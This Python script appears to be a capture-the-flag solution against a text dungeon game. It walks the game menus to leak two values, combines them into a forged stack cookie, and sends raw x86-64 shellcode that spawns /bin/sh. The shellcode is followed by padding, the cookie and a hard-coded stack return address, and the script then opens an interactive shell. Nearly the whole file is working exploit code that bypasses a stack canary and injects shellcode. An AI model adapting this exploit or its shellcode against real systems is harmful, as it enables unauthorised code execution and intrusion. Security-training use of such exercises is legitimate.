import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('continue...'))
p.send("\n")
print(p.readuntil('quit)'))
p.sendline("down")
print(p.readuntil('--+'))
print(p.readuntil('--+'))
p.sendline("run")
print(p.readuntil('quit)'))
p.sendline("left")
print(p.readuntil('--+'))
print(p.readuntil('--+'))
p.sendline("run")
print(p.readuntil('quit)'))
p.sendline("down")
print(p.readuntil('--+'))
print(p.readuntil('--+'))
p.sendline("fight")
print(p.readline())
print(p.readline())
p.readline()
monster_line = p.readline()
print("monster line: ", monster_line)
monster_val = int(monster_line.split()[5], 16)
print(monster_val)
print(p.readuntil("--+"))
attack_val = hex(~monster_val & 0xFFFFFFFF)[2:]
p.sendline(attack_val)
print(p.readuntil('continue...'))
p.send("\n")
print(p.readline())
print(p.readline())
treasure_line = p.readline()
print("treasure line: ", treasure_line)
treasure_val = int(treasure_line.split()[2])
print(treasure_val)
print(p.readuntil('quit)'))
p.sendline('quit')

cookie = (monster_val << 32) | treasure_val

shellcode = "\x48\x31\xC0\x50\x49\xBA\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x41\x52\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05\x90\x90\x90"
p.sendline(shellcode+'B'*8+p64(cookie)+p64(0x00007fffffffecd0))

p.interactive()
